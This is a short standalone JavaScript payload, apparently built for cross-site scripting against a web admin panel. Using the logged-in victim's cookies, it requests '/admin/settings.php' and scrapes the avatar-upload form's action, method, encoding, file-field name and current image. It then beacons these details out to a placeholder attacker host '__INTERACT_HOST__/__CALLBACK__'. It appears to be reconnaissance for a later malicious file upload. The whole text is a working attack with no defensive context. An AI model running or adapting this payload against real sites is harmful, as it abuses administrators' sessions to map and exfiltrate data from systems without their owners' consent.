(() => {
  if (window.__WINDOW_GUARD__) return;
  window.__WINDOW_GUARD__ = true;

  fetch('/admin/settings.php', { credentials: 'include' })
    .then(async response => {
      const html = await response.text();
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const form = doc.querySelector(
        'form[action="/admin/settings.php?action=avatar"]'
      );
      const input = form
        ? form.querySelector('input[type="file"]')
        : null;
      const avatar = doc.querySelector('img[alt="Current profile picture"]');
      const query = new URLSearchParams({
        status: String(response.status),
        title: doc.title,
        action: form ? form.getAttribute('action') || '' : '',
        method: form ? form.getAttribute('method') || '' : '',
        enctype: form ? form.getAttribute('enctype') || '' : '',
        field: input ? input.getAttribute('name') || '' : '',
        current: avatar ? avatar.getAttribute('src') || '' : ''
      });

      new Image().src =
        'http://__INTERACT_HOST__/__CALLBACK__?' + query.toString();
    })
    .catch(() => {
      new Image().src =
        'http://__INTERACT_HOST__/__CALLBACK__?status=ERROR';
    });
})();
